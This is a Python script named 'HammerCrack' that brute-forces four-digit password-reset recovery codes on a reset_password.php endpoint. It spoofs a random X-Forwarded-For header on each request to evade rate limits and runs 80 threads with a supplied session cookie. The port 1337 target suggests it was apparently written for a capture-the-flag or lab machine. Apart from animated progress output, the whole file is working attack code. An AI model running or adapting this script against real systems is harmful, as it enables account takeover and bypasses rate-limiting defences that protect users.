#!/usr/bin/env python3
# HammerCrack — Recovery-Code Cracker With XFF Rotation

import argparse, random, threading, sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import perf_counter, sleep
import requests
from rich.console import Console
from rich.panel import Panel

# colors
WHT="\033[97m"; GRN="\033[92m"; RED="\033[91m"; CYA="\033[96m"; MAG="\033[95m"; DIM="\033[2m"; RST="\033[0m"
BALL_COLORS = ["\033[36m", "\033[95m", "\033[92m", "\033[93m", "\033[91m"]  # cyan, magenta, green, yellow, red

console = Console()

def banner():
    # The banNer
    print(f"{MAG}╔{'═'*58}╗{RST}")
    print(f"{MAG}║{RST}  {WHT}HammerCrack{RST} — {CYA}Recovery-Code Cracker With XFF Rotation{RST}  {MAG}║{RST}")
    print(f"{MAG}╚{'═'*58}╝{RST}\n")

def rand_ip():
    return ".".join(str(random.randint(1,254)) for _ in range(4))

def parse_args():
    p = argparse.ArgumentParser(prog="HammerCrack")
    p.add_argument("--host", required=True)
    p.add_argument("--phpsessid", required=True)
    p.add_argument("--fail-text", default="Invalid or expired recovery code!")
    p.add_argument("--workers", type=int, default=80)
    p.add_argument("--hidden-s", default="")
    return p.parse_args()

def draw_progress(frame:int, done:int, total:int, start:float):
    width = 26
    balls = 3
    period = 2*(width-1) if width > 1 else 1
    track = [f"{DIM}·{RST}"] * width

    for b in range(balls):
        phase = frame + b * (period // balls)
        p = phase % period
        pos = p if p < width else (period - p)
        color = BALL_COLORS[(frame + b) % len(BALL_COLORS)]
        track[pos] = f"{color}●{RST}"

    pct = (done/total)*100 if total else 0.0
    elapsed = max(perf_counter() - start, 1e-6)
    rate = done / elapsed
    rem = max(total - done, 0)
    eta = rem / rate if rate > 0 else 0.0

    line = (
        f"{MAG}HammerCrack{RST}  "
        f"[{''.join(track)}]  "
        f"{CYA}{pct:5.1f}%{RST}  "
        f"{WHT}{done}/{total}{RST}  "
        f"{CYA}{rate:5.1f} req/s{RST}  "
        f"{WHT}ETA {eta:5.1f}s{RST}"
    )
    sys.stdout.write("\r" + line + "   ")
    sys.stdout.flush()

def main():
    banner()
    a = parse_args()

    url = f"http://{a.host}:1337/reset_password.php"
    origin = f"http://{a.host}:1337"

    sess = requests.Session()
    stop = threading.Event()
    hit  = {"code": None}

    total = 10000
    start = perf_counter()
    done_lock = threading.Lock()
    done = {"n": 0}
    frame = {"i": 0}

    # where it updates at a steady tick so it always "moves"
    min_anim = 1.5  # seconds: animate AT LEAST this long
    anim_started = perf_counter()
    def animate():
        while True:
            with done_lock:
                d = done["n"]
            frame["i"] += 1
            draw_progress(frame["i"], d, total, start)

            # stop when we have both
            if stop.is_set() and (perf_counter() - anim_started) >= min_anim:
                break
            sleep(0.06)  # ~16 FPS

        # finish line + spacing
        sys.stdout.write("\n\n"); sys.stdout.flush()

    anim_thread = threading.Thread(target=animate, daemon=True)
    anim_thread.start()

    def try_code(code:str):
        if stop.is_set(): return False
        headers = {
            "User-Agent":"HammerCrack/min-anim-1.0",
            "Content-Type":"application/x-www-form-urlencoded",
            "Origin":origin, "Referer":url, "Connection":"keep-alive",
            "X-Forwarded-For":rand_ip(),
        }
        data = {"recovery_code": code}
        if a.hidden_s: data["s"] = a.hidden_s
        try:
            r = sess.post(url, headers=headers, cookies={"PHPSESSID":a.phpsessid},
                          data=data, timeout=3, allow_redirects=False)
            ok = a.fail_text not in (r.text or "")
            if ok:
                hit["code"] = code
                stop.set()
            return ok
        except requests.RequestException:
            return False

    codes = (f"{i:04d}" for i in range(total))
    with ThreadPoolExecutor(max_workers=a.workers) as ex:
        futures = [ex.submit(try_code, c) for c in codes]
        for _ in as_completed(futures):
            with done_lock:
                done["n"] += 1
            if stop.is_set():
                break

    # signal animation to end and wait
    stop.set()
    anim_thread.join()

    elapsed = perf_counter() - start
    reqs = done["n"]
    rate = reqs / elapsed if elapsed > 0 else 0.0

    if hit["code"]:
        console.print(Panel.fit(
            f"[bold green]HIT![/]\n"
            f"[green]Recovery code:[/] [bold white]{hit['code']}[/]\n\n"
            f"[green]Requests made:[/] [white]{reqs}[/]\n"
            f"[green]Avg speed:    [/] [white]{rate:.1f} req/s[/]\n"
            f"[green]Total time:   [/] [white]{elapsed:.2f} s[/]",
            border_style="green"
        ))
    else:
        console.print(Panel.fit(
            "[bold red]No hit found.[/]\n\n"
            f"[red]Requests tried:[/] [white]{reqs}[/]\n"
            f"[red]Total time:    [/] [white]{elapsed:.2f} s[/]",
            border_style="red"
        ))

if __name__ == "__main__":
    main()
